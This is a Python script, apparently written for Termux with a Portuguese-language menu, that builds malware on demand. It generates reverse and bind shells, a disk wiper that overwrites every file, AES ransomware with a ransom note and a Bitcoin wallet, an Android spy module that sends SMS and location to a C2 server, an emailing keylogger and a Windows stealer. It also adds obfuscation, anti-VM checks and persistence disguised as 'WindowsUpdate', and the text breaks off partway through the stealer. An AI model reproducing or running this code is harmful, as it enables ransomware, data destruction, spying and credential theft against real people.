#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import base64
import zlib
import platform
import hashlib
import json
import threading
from typing import Dict, List, Optional

# Criptografia com pycryptodome (instalado como pycryptodomex)
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# Criptografia simples com chave simétrica (Fernet)
from cryptography.fernet import Fernet

# Interface colorida no terminal
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress
from rich.text import Text
from rich.syntax import Syntax

# Realce de código no terminal
import pygments
from pygments.lexers import PythonLexer, BashLexer
from pygments.formatters import TerminalFormatter

console = Console()

class GeradorPayloadsElite:
    def __init__(self):
        self.payloads = {
            'reverse_tcp': {
                'function': self.gerar_reverse_tcp,
                'category': 'Shells',
                'danger_level': 'medium',
                'description': 'Reverse Shell TCP avançado com persistência'
            },
            'bind_tcp': {
                'function': self.gerar_bind_tcp,
                'category': 'Shells',
                'danger_level': 'medium',
                'description': 'Bind Shell TCP com autenticação'
            },
            'limpar_disco': {
                'function': self.gerar_limpador_disco,
                'category': 'Destrutivos',
                'danger_level': 'high',
                'description': 'Sobrescreve o disco com dados aleatórios'
            },
            'ransomware_avancado': {
                'function': self.gerar_ransomware_avancado,
                'category': 'Destrutivos',
                'danger_level': 'critical',
                'description': 'Criptografa arquivos com AES-256 + persistência'
            },
            'termux_espiao': {
                'function': self.gerar_termux_espiao,
                'category': 'Termux',
                'danger_level': 'high',
                'description': 'Módulo de espionagem completo para Android'
            },
            'keylogger_avancado': {
                'function': self.gerar_keylogger_avancado,
                'category': 'Keyloggers',
                'danger_level': 'high',
                'description': 'Keylogger com captura de telas e envio C2'
            },
            'windows_stealer': {
                'function': self.gerar_windows_stealer,
                'category': 'Stealers',
                'danger_level': 'high',
                'description': 'Coleta informações sensíveis do Windows'
            },
            'browser_stealer': {
                'function': self.gerar_browser_stealer,
                'category': 'Stealers',
                'danger_level': 'high',
                'description': 'Rouba credenciais de navegadores + cookies'
            }
        }
        
        self.tecnicas_ofuscacao = {
            'polimorfico': 'Ofuscação polimórfica',
            'metamorfico': 'Ofuscação metamórfica',
            'criptografar_aes': 'Criptografia AES-256',
            'fragmentado': 'Fragmentação de código',
            'anti_analise': 'Técnicas anti-análise'
        }
        
        self.banners = [
            self._gerar_banner_apocaliptico(),
            self._gerar_banner_matrix(),
            self._gerar_banner_sangue()
        ]
        
        self.c2_server = "https://seu-server-c2.com/api"
        self.persistencia_methods = {
            'registry': 'Persistência via Registro (Windows)',
            'cron': 'Persistência via Cron (Linux)',
            'service': 'Persistência via Serviço',
            'startup': 'Persistência via Pasta Inicialização'
        }
        
        self._verificar_dependencias()
    
    def _gerar_banner_apocaliptico(self) -> str:
        return """
[bold red]
 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄  
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ 
▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌
▐░▌          ▐░▌       ▐░▌▐░▌          ▐░▌          ▐░▌       ▐░▌
▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌
▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀█░█▀▀  ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌
▐░▌          ▐░▌     ▐░▌            ▐░▌▐░▌          ▐░▌       ▐░▌
▐░▌          ▐░▌      ▐░▌  ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌
▐░▌          ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ 
 ▀            ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀  
[/bold red]
[bold white on red]        GERADOR DE PAYLOADS ELITE v7.0 - DARK EDITION[/bold white on red]
"""
    
    def _gerar_banner_matrix(self) -> str:
        return """
[bold green]
          0101010 01010101 01010101 01010101 01010101 0101010
        0101010101010101010101010101010101010101010101010101010
      01010101010101010101010101010101010101010101010101010101010
    010101010101010101010101010101010101010101010101010101010101010
  0101010101010101010101010101010101010101010101010101010101010101010
01010101010101010101010101010101010101010101010101010101010101010101010
01010101010101010101010101010101010101010101010101010101010101010101010
01010101010101010101010101010101010101010101010101010101010101010101010
 0101010101010101010101010101010101010101010101010101010101010101010
   010101010101010101010101010101010101010101010101010101010101010
     01010101010101010101010101010101010101010101010101010101010
       0101010101010101010101010101010101010101010101010101010
         01010101010101010101010101010101010101010101010101010
           0101010101010101010101010101010101010101010101010
             010101010101010101010101010101010101010101010
               01010101010101010101010101010101010101010
                 0101010101010101010101010101010101010
                   010101010101010101010101010101010
                     01010101010101010101010101010
                       0101010101010101010101010
                         010101010101010101010
                           01010101010101010
                             0101010101010
                               010101010
                                 01010
                                   0
[/bold green]
[bold black on green]        SISTEMA DE GERACAO DE PAYLOADS - MATRIX MODE[/bold black on green]
"""
    
    def _gerar_banner_sangue(self) -> str:
        return """
[bold red]
          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '
[/bold red]
[bold white on red]        GERADOR DE PAYLOADS - EDICAO SANGUE[/bold white on red]
"""
    
    def _verificar_dependencias(self):
        required = {
            'cryptography': 'cryptography',
            'pycryptodome': 'pycryptodomex',
            'rich': 'rich',
            'pygments': 'pygments',
            'keyboard': 'keyboard'
        }
        
        missing = []
        for pkg, install_name in required.items():
            try:
                __import__(pkg)
            except ImportError:
                missing.append(install_name)
        
        if missing:
            console.print(Panel.fit(
                f"[red]✗ Dependências faltando: {', '.join(missing)}[/red]",
                title="[bold red]ERRO[/bold red]",
                border_style="red"
            ))
            if Confirm.ask("Deseja instalar automaticamente?"):
                with Progress() as progress:
                    task = progress.add_task("[red]Instalando...[/red]", total=len(missing))
                    for pkg in missing:
                        os.system(f"pip install {pkg} --quiet")
                        progress.update(task, advance=1)
                console.print("[green]✓ Dependências instaladas![/green]")
                time.sleep(1)
    
    def mostrar_banner(self):
        console.print(random.choice(self.banners))
        console.print(Panel.fit(
            "[blink bold red]⚠️ USE APENAS PARA TESTES AUTORIZADOS! ⚠️[/blink bold red]",
            style="red on black"
        ))
        time.sleep(1)
    
    def mostrar_menu_principal(self):
        while True:
            console.clear()
            self.mostrar_banner()
            
            tabela = Table(
                title="[bold cyan]🔧 MENU PRINCIPAL[/bold cyan]",
                show_header=True,
                header_style="bold magenta"
            )
            tabela.add_column("Opção", style="cyan", width=10)
            tabela.add_column("Categoria", style="green")
            tabela.add_column("Perigo", style="red")
            
            categorias = {
                'Shells': "Shells Avançados",
                'Destrutivos': "Payloads Destrutivos",
                'Termux': "Módulos Termux",
                'Keyloggers': "Keyloggers Avançados",
                'Stealers': "Stealers de Dados"
            }
            
            for i, (cod, nome) in enumerate(categorias.items(), 1):
                perigo = "☠️ CRÍTICO" if cod == 'Destrutivos' else "⚠️ ALTO" if cod in ['Termux', 'Keyloggers', 'Stealers'] else "◎ MÉDIO"
                tabela.add_row(str(i), nome, perigo)
            
            tabela.add_row("0", "Configurações", "⚙️")
            tabela.add_row("9", "Sair", "🚪")
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione",
                choices=[str(i) for i in range(0, 10)] + ['9'],
                show_choices=False
            )
            
            if escolha == "1":
                self._mostrar_submenu('Shells')
            elif escolha == "2":
                self._mostrar_submenu('Destrutivos')
            elif escolha == "3":
                self._mostrar_submenu('Termux')
            elif escolha == "4":
                self._mostrar_submenu('Keyloggers')
            elif escolha == "5":
                self._mostrar_submenu('Stealers')
            elif escolha == "0":
                self._mostrar_menu_configuracao()
            elif escolha == "9":
                self._sair()
    
    def _mostrar_submenu(self, categoria: str):
        payloads_categoria = {k: v for k, v in self.payloads.items() if v['category'] == categoria}
        
        while True:
            console.clear()
            titulo = f"[bold]{categoria.upper()}[/bold] - Selecione"
            
            if categoria == 'Destrutivos':
                titulo = f"[blink bold red]☠️ {categoria.upper()} ☠️[/blink bold red]"
            
            tabela = Table(
                title=titulo,
                show_header=True,
                header_style="bold blue"
            )
            tabela.add_column("ID", style="cyan", width=5)
            tabela.add_column("Nome", style="green")
            tabela.add_column("Descrição")
            tabela.add_column("Perigo", style="red")
            
            for i, (nome, dados) in enumerate(payloads_categoria.items(), 1):
                icone_perigo = {
                    'medium': '⚠️',
                    'high': '🔥',
                    'critical': '💀'
                }.get(dados['danger_level'], '')
                tabela.add_row(
                    str(i),
                    nome,
                    dados['description'],
                    f"{icone_perigo} {dados['danger_level'].upper()}"
                )
            
            tabela.add_row("0", "Voltar", "Retornar", "↩️")
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione",
                choices=[str(i) for i in range(0, len(payloads_categoria)+1)],
                show_choices=False
            )
            
            if escolha == "0":
                return
            
            nome_payload = list(payloads_categoria.keys())[int(escolha)-1]
            self._processar_payload(nome_payload)
    
    def _processar_payload(self, nome_payload: str):
        payload_data = self.payloads[nome_payload]
        
        if payload_data['danger_level'] in ['high', 'critical']:
            console.print(Panel.fit(
                "[blink bold red]⚠️ PERIGO ELEVADO ⚠️[/blink bold red]\n"
                "Este payload pode causar danos permanentes\n"
                "Use apenas em ambientes controlados!",
                border_style="red"
            ))
            
            if not Confirm.ask("Confirmar criação?", default=False):
                return
        
        config = self._configurar_payload(nome_payload)
        if config is None:
            return
        
        ofuscar = Confirm.ask("Aplicar técnicas de ofuscação?")
        tecnicas = []
        if ofuscar:
            tecnicas = self._selecionar_tecnicas_ofuscacao()
        
        persistencia = False
        if nome_payload in ['reverse_tcp', 'bind_tcp', 'keylogger_avancado', 'windows_stealer']:
            persistencia = Confirm.ask("Adicionar persistência?")
        
        with Progress() as progress:
            task = progress.add_task("[red]Gerando...[/red]", total=100)
            
            payload = payload_data['function'](**config)
            progress.update(task, advance=30)
            
            if ofuscar:
                for tecnica in tecnicas:
                    payload = self._ofuscar_avancado(payload, tecnica)
                    progress.update(task, advance=20)
            
            if persistencia:
                payload = self._adicionar_persistencia(payload)
                progress.update(task, advance=10)
            
            progress.update(task, completed=100)
        
        self._preview_payload(payload, 'python')
        self._salvar_payload(nome_payload, payload)
    
    def _configurar_payload(self, nome_payload: str) -> Optional[Dict]:
        config = {}
        
        if nome_payload in ['reverse_tcp', 'bind_tcp']:
            console.print(Panel.fit(
                "[bold]Configuração[/bold]",
                border_style="blue"
            ))
            config['ip'] = Prompt.ask("[yellow]?[/yellow] IP", default="192.168.1.100")
            config['porta'] = IntPrompt.ask("[yellow]?[/yellow] Porta", default=4444)
            config['retry'] = Confirm.ask("[yellow]?[/yellow] Tentar reconexão automática?", default=True)
            config['timeout'] = IntPrompt.ask("[yellow]?[/yellow] Timeout (segundos)", default=30)
        
        elif nome_payload == 'ransomware_avancado':
            console.print(Panel.fit(
                "[bold red]Configuração[/bold red]",
                border_style="red"
            ))
            config['extensoes'] = Prompt.ask(
                "[yellow]?[/yellow] Extensões (separadas por vírgula)",
                default=".doc,.docx,.xls,.xlsx,.pdf,.jpg,.png,.txt,.sql,.db"
            ).split(',')
            config['resgate'] = Prompt.ask(
                "[yellow]?[/yellow] Mensagem de resgate",
                default="Seus arquivos foram criptografados com AES-256!"
            )
            config['btc_wallet'] = Prompt.ask(
                "[yellow]?[/yellow] Carteira Bitcoin para resgate",
                default="1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
            )
        
        elif nome_payload in ['termux_espiao', 'windows_stealer', 'browser_stealer']:
            config['c2_server'] = Prompt.ask(
                "[yellow]?[/yellow] Servidor C2",
                default=self.c2_server
            )
            config['intervalo'] = IntPrompt.ask(
                "[yellow]?[/yellow] Intervalo (minutos)",
                default=15
            )
        
        elif nome_payload == 'keylogger_avancado':
            config['email'] = Prompt.ask(
                "[yellow]?[/yellow] Email para envio dos logs",
                default="hacker@protonmail.com"
            )
            config['password'] = Prompt.ask(
                "[yellow]?[/yellow] Senha do email",
                default="s3cr3t"
            )
            config['interval'] = IntPrompt.ask(
                "[yellow]?[/yellow] Intervalo de envio (minutos)",
                default=60
            )
            config['screenshot'] = Confirm.ask(
                "[yellow]?[/yellow] Capturar screenshots periódicos?",
                default=True
            )
        
        console.print("\n[bold]Resumo:[/bold]")
        for chave, valor in config.items():
            console.print(f"  [cyan]{chave}:[/cyan] {valor}")
        
        if not Confirm.ask("Confirmar?"):
            return None
        
        return config
    
    def _selecionar_tecnicas_ofuscacao(self) -> List[str]:
        console.print("\n[bold]Técnicas:[/bold]")
        tabela = Table(show_header=True, header_style="bold magenta")
        tabela.add_column("ID", style="cyan", width=5)
        tabela.add_column("Técnica", style="green")
        
        for i, (codigo, desc) in enumerate(self.tecnicas_ofuscacao.items(), 1):
            tabela.add_row(str(i), desc)
        
        console.print(tabela)
        
        escolhas = Prompt.ask(
            "[yellow]?[/yellow] Selecione (separadas por vírgula)",
            default="1,3"
        )
        
        return [list(self.tecnicas_ofuscacao.keys())[int(x)-1] for x in escolhas.split(',')]
    
    def _preview_payload(self, payload: str, language: str = 'python'):
        console.print(Panel.fit(
            "[bold]PRÉ-VISUALIZAÇÃO[/bold]",
            border_style="yellow"
        ))
        
        lexer = PythonLexer() if language == 'python' else BashLexer()
        formatter = TerminalFormatter()
        
        lines = payload.split('\n')[:50]
        code = '\n'.join(lines)
        
        highlighted = pygments.highlight(code, lexer, formatter)
        console.print(highlighted)
        
        if len(payload.split('\n')) > 50:
            console.print("[yellow]... (truncado)[/yellow]")
    
    def _salvar_payload(self, nome_payload: str, payload: str):
        nome_arquivo = Prompt.ask(
            "[yellow]?[/yellow] Nome do arquivo",
            default=f"payload_{nome_payload}.py"
        )
        
        try:
            with open(nome_arquivo, 'w', encoding='utf-8') as f:
                f.write(payload)
            
            with open(nome_arquivo, 'rb') as f:
                md5 = hashlib.md5(f.read()).hexdigest()
                sha256 = hashlib.sha256(f.read()).hexdigest()
            
            console.print(Panel.fit(
                f"[green]✓ Salvo como [bold]{nome_arquivo}[/bold][/green]\n"
                f"[cyan]MD5: [bold]{md5}[/bold][/cyan]\n"
                f"[cyan]SHA256: [bold]{sha256}[/bold][/cyan]",
                title="[bold green]SUCESSO[/bold green]",
                border_style="green"
            ))
            
        except Exception as e:
            console.print(Panel.fit(
                f"[red]✗ Erro: {str(e)}[/red]",
                title="[bold red]ERRO[/bold red]",
                border_style="red"
            ))
        
        input("\nPressione Enter para continuar...")
    
    def _mostrar_menu_configuracao(self):
        while True:
            console.clear()
            console.print(Panel.fit(
                "[bold cyan]⚙️ CONFIGURAÇÕES[/bold cyan]",
                border_style="cyan"
            ))
            
            tabela = Table(show_header=False)
            tabela.add_row("1", "Alterar servidor C2")
            tabela.add_row("2", "Testar ofuscação")
            tabela.add_row("3", "Verificar dependências")
            tabela.add_row("0", "Voltar")
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione",
                choices=["0", "1", "2", "3"],
                show_choices=False
            )
            
            if escolha == "1":
                self.c2_server = Prompt.ask(
                    "[yellow]?[/yellow] Novo servidor C2",
                    default=self.c2_server
                )
            elif escolha == "2":
                self._testar_ofuscacao()
            elif escolha == "3":
                self._verificar_dependencias()
            elif escolha == "0":
                return
    
    def _testar_ofuscacao(self):
        console.clear()
        codigo_teste = "print('Hello World')"
        
        console.print(Panel.fit(
            "[bold]TESTE DE OFUSCAÇÃO[/bold]",
            border_style="yellow"
        ))
        
        tabela = Table(title="Técnicas", show_header=True, header_style="bold magenta")
        tabela.add_column("ID", style="cyan")
        tabela.add_column("Técnica")
        
        for i, (codigo, desc) in enumerate(self.tecnicas_ofuscacao.items(), 1):
            tabela.add_row(str(i), desc)
        
        console.print(tabela)
        
        escolha = Prompt.ask(
            "[yellow]?[/yellow] Selecione",
            choices=[str(i) for i in range(1, len(self.tecnicas_ofuscacao)+1)],
            show_choices=False
        )
        
        tecnica = list(self.tecnicas_ofuscacao.keys())[int(escolha)-1]
        codigo_ofuscado = self._ofuscar_avancado(codigo_teste, tecnica)
        
        console.print("\nResultado:")
        console.print(Syntax(codigo_ofuscado, "python"))
        
        input("\nPressione Enter para continuar...")
    
    def _ofuscar_avancado(self, payload: str, tecnica: str) -> str:
        if tecnica == 'polimorfico':
            return self._ofuscar_polimorfico(payload)
        elif tecnica == 'metamorfico':
            return self._ofuscar_metamorfico(payload)
        elif tecnica == 'criptografar_aes':
            return self._ofuscar_com_criptografia(payload)
        elif tecnica == 'fragmentado':
            return self._ofuscar_fragmentado(payload)
        elif tecnica == 'anti_analise':
            return self._adicionar_anti_analise(payload)
        return payload
    
    def _ofuscar_polimorfico(self, payload: str) -> str:
        vars_random = [''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)) for _ in range(5)]
        
        codigo_lixo = [
            f"for {vars_random[0]} in range({random.randint(1,10)}): {vars_random[1]} = {random.randint(100,999)}",
            f"{vars_random[2]} = lambda {vars_random[3]}: {vars_random[3]}**{random.randint(2,5)}",
            f"def {vars_random[4]}(x): return x + {random.randint(1,100)}"
        ]
        random.shuffle(codigo_lixo)
        
        compressed = zlib.compress(payload.encode())
        b64_encoded = base64.b64encode(compressed)
        
        return f"""import base64,zlib
{'; '.join(codigo_lixo)}
{vars_random[4]} = {b64_encoded}
exec(zlib.decompress(base64.b64decode({vars_random[4]})))"""
    
    def _ofuscar_metamorfico(self, payload: str) -> str:
        replacements = {}
        lines = payload.split('\n')
        
        for i, line in enumerate(lines):
            if 'def ' in line:
                func_name = line.split('def ')[1].split('(')[0].strip()
                new_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
                replacements[func_name] = new_name
                lines[i] = line.replace(func_name, new_name)
        
        for i, line in enumerate(lines):
            for old, new in replacements.items():
                lines[i] = lines[i].replace(old, new)
        
        return '\n'.join(lines)
    
    def _ofuscar_com_criptografia(self, payload: str) -> str:
        key = Fernet.generate_key()
        cipher = Fernet(key)
        encrypted = cipher.encrypt(payload.encode())
        
        return f"""from cryptography.fernet import Fernet
key = {key}
cipher = Fernet(key)
exec(cipher.decrypt({encrypted}).decode())"""
    
    def _ofuscar_fragmentado(self, payload: str) -> str:
        parts = []
        chunk_size = len(payload) // 5
        for i in range(0, len(payload), chunk_size):
            part = payload[i:i+chunk_size]
            parts.append(base64.b64encode(part.encode()).decode())
        
        var_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
        code = f"{var_name} = ["
        for part in parts:
            code += f'"{part}", '
        code = code.rstrip(', ') + ']\n'
        code += f'exec("".join([base64.b64decode(p).decode() for p in {var_name}]))'
        
        return f"import base64\n{code}"
    
    def _adicionar_anti_analise(self, payload: str) -> str:
        anti_code = """
def _check_debug():
    try:
        if hasattr(sys, 'gettrace') and sys.gettrace():
            os._exit(1)
    except:
        pass

def _check_vm():
    try:
        if platform.system() == "Windows":
            import wmi
            c = wmi.WMI()
            for process in c.Win32_Process():
                if any(x in process.Name.lower() for x in ['vmware', 'vbox', 'qemu']):
                    os._exit(1)
        else:
            if any(x in open('/proc/cpuinfo').read().lower() for x in ['hypervisor', 'vmx', 'svm']):
                os._exit(1)
    except:
        pass

def _check_sandbox():
    try:
        if os.path.exists('/proc/self/status'):
            with open('/proc/self/status') as f:
                status = f.read()
                if 'TracerPid:' in status and int(status.split('TracerPid:')[1].split('\\n')[0].strip()) > 0:
                    os._exit(1)
    except:
        pass

_check_debug()
_check_vm()
_check_sandbox()
"""
        return anti_code + payload
    
    def _adicionar_persistencia(self, payload: str) -> str:
        persist_code = """
def _add_persistence():
    try:
        if platform.system() == "Windows":
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as regkey:
                winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable + " " + __file__)
        else:
            cron_job = f"@reboot python3 {os.path.abspath(__file__)}"
            with open("/tmp/cronjob", "w") as f:
                f.write(cron_job)
            os.system("crontab /tmp/cronjob")
            os.remove("/tmp/cronjob")
    except:
        pass

_add_persistence()
"""
        return payload + persist_code

    # Implementações dos payloads melhorados
    def gerar_reverse_tcp(self, ip: str, porta: int, retry: bool = True, timeout: int = 30, **kwargs) -> str:
        return f"""import socket
import subprocess
import os
import time
import sys

def connect(ip, port, timeout):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((ip, port))
            
            # Shell interativo
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            
            # Executar shell baseado no SO
            if os.name == 'nt':
                subprocess.call(["cmd.exe"])
            else:
                subprocess.call(["/bin/sh", "-i"])
            
            # Se a conexão cair, sair
            break
                
        except Exception as e:
            if not retry:
                break
            time.sleep(5)

if __name__ == "__main__":
    connect("{ip}", {porta}, {timeout})
"""

    def gerar_bind_tcp(self, ip: str, porta: int, **kwargs) -> str:
        return f"""import socket
import subprocess
import os
import threading

def handle_client(conn, addr):
    try:
        print(f"Conexão estabelecida de {{addr}}")
        
        # Redirecionar entrada/saída/erro
        os.dup2(conn.fileno(), 0)
        os.dup2(conn.fileno(), 1)
        os.dup2(conn.fileno(), 2)
        
        # Executar shell baseado no SO
        if os.name == 'nt':
            subprocess.call(["cmd.exe"])
        else:
            subprocess.call(["/bin/sh", "-i"])
            
    except Exception as e:
        print(f"Erro: {{e}}")
    finally:
        conn.close()

def start_server(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((ip, port))
    s.listen(5)
    print(f"Escutando em {{ip}}:{{port}}")
    
    while True:
        try:
            conn, addr = s.accept()
            client_thread = threading.Thread(target=handle_client, args=(conn, addr))
            client_thread.daemon = True
            client_thread.start()
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"Erro ao aceitar conexão: {{e}}")

if __name__ == "__main__":
    start_server("{ip}", {porta})
"""

    def gerar_limpador_disco(self, **kwargs) -> str:
        return """import os
import random
import threading

def limpar_arquivo(path):
    try:
        with open(path, 'wb') as f:
            size = os.path.getsize(path)
            f.write(os.urandom(size))
        os.remove(path)
    except:
        pass

def limpar_disco():
    try:
        for root, dirs, files in os.walk('/'):
            for file in files:
                path = os.path.join(root, file)
                t = threading.Thread(target=limpar_arquivo, args=(path,))
                t.start()
    except:
        pass

if __name__ == "__main__":
    limpar_disco()"""

    def gerar_ransomware_avancado(self, extensoes: List[str], resgate: str, btc_wallet: str, **kwargs) -> str:
        ext_str = ', '.join(f'"{ext}"' for ext in extensoes)
        return f"""import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64
import threading

KEY = os.urandom(32)
IV = os.urandom(16)

def encrypt_file(filename):
    try:
        with open(filename, 'rb') as f:
            data = f.read()
        
        cipher = AES.new(KEY, AES.MODE_CBC, IV)
        encrypted = cipher.encrypt(pad(data, AES.block_size))
        
        with open(filename + '.encrypted', 'wb') as f:
            f.write(encrypted)
        
        os.remove(filename)
    except:
        pass

def gerar_resgate():
    with open('LEIA-ME.txt', 'w') as f:
        f.write('''{resgate}
        
Para recuperar seus arquivos, envie 0.5 BTC para:
{btc_wallet}

Contate-nos no email: decrypt2023@protonmail.com
        ''')

def processar_arquivos():
    threads = []
    for root, dirs, files in os.walk('/'):
        for file in files:
            if any(file.endswith(ext) for ext in [{ext_str}]):
                path = os.path.join(root, file)
                t = threading.Thread(target=encrypt_file, args=(path,))
                t.start()
                threads.append(t)
    
    for t in threads:
        t.join()

if __name__ == "__main__":
    processar_arquivos()
    gerar_resgate()"""

    def gerar_termux_espiao(self, c2_server: str, intervalo: int, **kwargs) -> str:
        return f"""import os
import requests
import threading
import time
from subprocess import check_output

class TermuxEspiao:
    def __init__(self):
        self.c2_server = "{c2_server}"
        self.interval = {intervalo} * 60
        
    def collect_data(self):
        data = {{
            "device": check_output("uname -a", shell=True).decode(),
            "wifi": check_output("termux-wifi-scaninfo", shell=True).decode(),
            "battery": check_output("termux-battery-status", shell=True).decode()
        }}
        
        try:
            data["sms"] = check_output("termux-sms-list -l 10", shell=True).decode()
        except:
            pass
            
        try:
            data["location"] = check_output("termux-location", shell=True).decode()
        except:
            pass
            
        return data
    
    def send_to_c2(self, data):
        try:
            requests.post(self.c2_server, json=data, timeout=10)
        except:
            pass
    
    def run(self):
        while True:
            data = self.collect_data()
            self.send_to_c2(data)
            time.sleep(self.interval)

if __name__ == "__main__":
    spy = TermuxEspiao()
    spy.run()"""

    def gerar_keylogger_avancado(self, email: str, password: str, interval: int, screenshot: bool = True, **kwargs) -> str:
        screenshot_code = """
    def capture_screenshot(self):
        try:
            if platform.system() == "Windows":
                import pyautogui
                screenshot = pyautogui.screenshot()
                screenshot.save("screenshot.png")
                return "screenshot.png"
            else:
                return None
        except:
            return None
""" if screenshot else ""

        screenshot_send = """
            # Enviar screenshot
            if self.screenshot:
                screenshot_file = self.capture_screenshot()
                if screenshot_file:
                    with open(screenshot_file, "rb") as f:
                        screenshot_data = f.read()
                    msg.attach(MIMEImage(screenshot_data, name=os.path.basename(screenshot_file)))
                    os.remove(screenshot_file)
""" if screenshot else ""

        return f"""import keyboard
import smtplib
from threading import Timer
from datetime import datetime
import os
import platform
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
{"from email.mime.image import MIMEImage" if screenshot else ""}

class Keylogger:
    def __init__(self, interval={interval}, email="{email}", password="{password}"):
        self.interval = interval * 60  # Converter para segundos
        self.log = ""
        self.email = email
        self.password = password
        self.screenshot = {str(screenshot).lower()}
    
    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{{name.upper()}}]"
        
        self.log += name
    
    {screenshot_code}
    
    def send_email(self, email, password, message):
        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = email
        msg['Subject'] = f"Keylogger Report - {{datetime.now().strftime('%Y-%m-%d %H:%M')}}"
        
        msg.attach(MIMEText(message, 'plain'))
        {screenshot_send}
        
        try:
            server = smtplib.SMTP(host="smtp.gmail.com", port=587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, msg.as_string())
            server.quit()
        except Exception as e:
            pass
    
    def report(self):
        if self.log:
            if self.email and self.password:
                self.send_email(self.email, self.password, self.log)
            
            self.log = ""
        
        Timer(interval=self.interval, function=self.report).start()
    
    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()"""

    def gerar_windows_stealer(self, c2_server: str, intervalo: int, **kwargs) -> str:
        return f"""import os
import requests
import platform
import subprocess
import json
import time
import socket
import getpass

class WindowsStealer:
    def __init__(self):
        self.c2_server = "{c2_server}"
        self.interval = {intervalo} * 60
        
    def collect_system_info(self):
        return {{
            "system": platform.uname()._asdict(),
            "hostname": socket.gethostname(),
            "username": getpass.getuser(),
            "network": subprocess.check_output("ipconfig /all", shell=True).decode(),
            "users": os.listdir("C:\\\\Users"),
            "processes": subprocess.check_output("tasklist", shell=True).decode()
        }}
    
    def collect_sensitive_files(self):
        sensitive_files = []
        try:
            desktop = os.path.join("C:\\\\Users", getpass.getuser(), "Desktop")
            for root, dirs, files in os.walk(desktop):
                for file in files:
                    if file.endswith(('.txt', '.doc', '.docx', '.xls', '.xlsx', '.pdf')):
                        sensitive_files.append(os.path.join(root, file))
        except:
            pass
        return sensitive_files
    
    def send_to_c2(self, data):
        try:
